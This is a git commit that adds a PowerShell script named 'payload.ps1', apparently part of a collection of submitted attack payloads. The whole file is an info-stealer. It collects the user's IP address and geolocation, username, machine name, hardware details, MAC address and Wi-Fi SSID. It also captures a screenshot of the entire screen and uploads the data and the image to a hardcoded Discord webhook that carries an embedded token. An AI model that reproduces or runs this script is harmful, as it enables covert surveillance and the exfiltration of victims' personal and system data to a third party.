5f96085d588021dfc779b5cb60be065b3c07e429
Ryan <ryanraymond2010@gmail.com>
2025-07-15 00:55:52 -0400

    Create payload.ps1

---
+++ submissions/sysInfo/payload.ps1
@@ -0,0 +1,54 @@
+$ip = (Invoke-RestMethod -Uri "https://api.ipify.org")
+
+$geo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
+$city = $geo.city
+$region = $geo.region
+$country = $geo.country
+
+$usr = $env:USERNAME
+$hostname = $env:COMPUTERNAME
+
+$cpu = (Get-CimInstance Win32_Processor).Name
+$gpu = (Get-CimInstance Win32_VideoController).Name
+$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
+
+$mac = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
+$ssid = (netsh wlan show interfaces) -match 'SSID' | Select-Object -First 1
+
+$webhookUrl = "https://discord.com/api/webhooks/1393710176049303582/Q48gWu3VqznaGkZ2R32KTdQmrX8WxoFaKve9L6XiPQBvFGtCYtwShx76eutG17unxx3y"
+
+$output = @{
+    content = 
+    "
+    IP: $ip
+    Location: $city, $region, $country
+    Name: $usr
+    PC Name: $hostname
+    CPU: $cpu
+    GPU: $gpu
+    RAM: $ram
+    MAC Address: $mac
+    SSID: $ssid
+    "
+} | ConvertTo-Json
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$screenWidth = [System.Windows.Forms.SystemInformation]::VirtualScreen.Width
+$screenHeight = [System.Windows.Forms.SystemInformation]::VirtualScreen.Height
+$screenLeft = [System.Windows.Forms.SystemInformation]::VirtualScreen.Left
+$screenTop = [System.Windows.Forms.SystemInformation]::VirtualScreen.Top
+
+$bitmap = New-Object System.Drawing.Bitmap $screenWidth, $screenHeight
+
+$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen($screenLeft, $screenTop, 0, 0, $bitmap.Size)
+
+$bitmap.Save("$env:TEMP\screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
+
+$graphics.Dispose()
+$bitmap.Dispose()
+
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $output -ContentType "application/json"
+curl.exe -F "file=@$env:TEMP\screenshot.png" "$webhookUrl"
